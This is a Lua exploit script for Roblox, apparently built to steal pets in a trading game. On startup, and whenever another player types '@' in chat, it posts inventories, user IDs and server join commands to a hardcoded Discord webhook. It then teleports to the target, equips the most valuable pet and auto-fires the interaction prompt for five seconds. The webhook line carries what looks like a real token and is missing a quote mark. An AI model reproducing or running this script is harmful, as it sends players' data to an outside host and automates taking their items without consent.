local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local UserInputService = game:GetService("UserInputService")

-- CONFIG (REPLACE WITH YOUR WEBHOOK)
local WEBHOOK_URL = https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"

-- PET PRIORITY (Highest to Lowest)
local PET_PRIORITY = {
    ["T-Rex"] = 100,
    ["Dragonfly"] = 90,
    ["Queen bee"] = 85,
    ["Disco bee"] = 80,
    ["Raccoon"] = 75,
    ["Mimic Octopus"] = 70,
    ["Butterfly"] = 65
}

-- ITEMS TO IGNORE
local IGNORE_ITEMS = {
    "Shovel",
    "Destroy Plants"
}

--[[ WEBHOOK THAT WORKS ]]--
local function sendWebhook(player)
    -- Get all items from inventory
    local items = {}
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _,item in pairs(backpack:GetChildren()) do
            table.insert(items, item.Name)
        end
    end
    
    -- Check for rare pets
    local hasRare = false
    for pet in pairs(PET_PRIORITY) do
        if table.find(items, pet) then
            hasRare = true
            break
        end
    end

    local embed = {
        title = "📦 "..player.Name.."'s Inventory",
        description = #items > 0 and table.concat(items, "\n") or "No items found",
        color = hasRare and 0xFF0000 or 0x00FF00,
        fields = {
            {
                name = "JOIN SCRIPT", 
                value = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', game.PlaceId, game.JobId),
                inline = false
            },
            {
                name = "User ID",
                value = tostring(player.UserId),
                inline = true
            },
            {
                name = "Account Age",
                value = tostring(player.AccountAge),
                inline = true
            }
        }
    }

    local payload = {
        content = hasRare and "@everyone" or nil,
        embeds = {embed}
    }
    
    local success, err = pcall(function()
        local response = HttpService:RequestAsync({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
        return response.Success
    end)
    
    if not success then
        warn("Webhook failed: "..tostring(err))
    end
end

--[[ GET BEST ITEM ]]--
local function getBestItem()
    local bestItem, highestScore = nil, 0
    
    for _,item in pairs(LocalPlayer.Backpack:GetChildren()) do
        -- Skip ignored items
        local shouldIgnore = false
        for _,ignore in pairs(IGNORE_ITEMS) do
            if string.find(item.Name, ignore) then
                shouldIgnore = true
                break
            end
        end
        if shouldIgnore then continue end
        
        -- Check pet priority
        local score = 0
        for pet, points in pairs(PET_PRIORITY) do
            if string.find(item.Name, pet) then
                score = points
                break
            end
        end
        
        if score > highestScore then
            highestScore = score
            bestItem = item
        end
    end
    
    return bestItem
end

--[[ FIND INTERACTION POINT ]]--
local function findInteraction(targetChar)
    -- First find ProximityPrompt
    for _,part in pairs(targetChar:GetDescendants()) do
        if part:IsA("ProximityPrompt") then
            local pos = part.Parent:GetPivot().Position
            local screenPos = Camera:WorldToViewportPoint(pos)
            return Vector2.new(screenPos.X, screenPos.Y), part
        end
    end
    
    -- Fallback to torso center
    local torso = targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso")
    if torso then
        local screenPos = Camera:WorldToViewportPoint(torso.Position)
        return Vector2.new(screenPos.X, screenPos.Y)
    end
    
    -- Final fallback to screen center
    return Vector2.new(0.5, 0.5)
end

--[[ TELEPORT AND INTERACT ]]--
local function teleportAndInteract(target)
    -- Get target character
    local targetChar = target.Character or target.CharacterAdded:Wait()
    local torso = targetChar:WaitForChild("UpperTorso") or targetChar:WaitForChild("Torso")

    -- TELEPORT to 4 studs away
    LocalPlayer.Character.HumanoidRootPart.CFrame = torso.CFrame * CFrame.new(0, 0, -4)

    -- Force FIRST PERSON
    LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
    LocalPlayer.CameraMaxZoomDistance = 0.5
    LocalPlayer.CameraMinZoomDistance = 0.5

    -- Find EXACT click position
    local clickPosition, prompt = findInteraction(targetChar)
    UserInputService:SetMouseLocation(clickPosition.X, clickPosition.Y)

    -- Equip BEST ITEM
    local item = getBestItem()
    if item then
        LocalPlayer.Character.Humanoid:EquipTool(item)
        task.wait(0.2)
    end

    -- HOLD INTERACTION for 5 seconds
    if prompt then
        local start = os.clock()
        while os.clock() - start < 5 do
            fireproximityprompt(prompt)
            task.wait(0.1)
        end
    else
        mouse1press()
        task.wait(5)
        mouse1release()
    end
end

--[[ CHAT DETECTION ]]--
local function onChatted(player, msg)
    if player == LocalPlayer then return end
    if not msg or not string.find(string.lower(tostring(msg)), "@") then return end
    
    -- SEND WEBHOOK with full inventory
    sendWebhook(player)
    
    -- TELEPORT AND INTERACT
    teleportAndInteract(player)
end

--[[ INITIALIZE ]]--
-- Send initial webhook with local player's inventory
sendWebhook(LocalPlayer)

-- Set up chat listeners
for _,player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(msg)
            onChatted(player, msg)
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        onChatted(player, msg)
    end)
end)

print("✅ SYSTEM WORKING - Waiting for @ mentions")
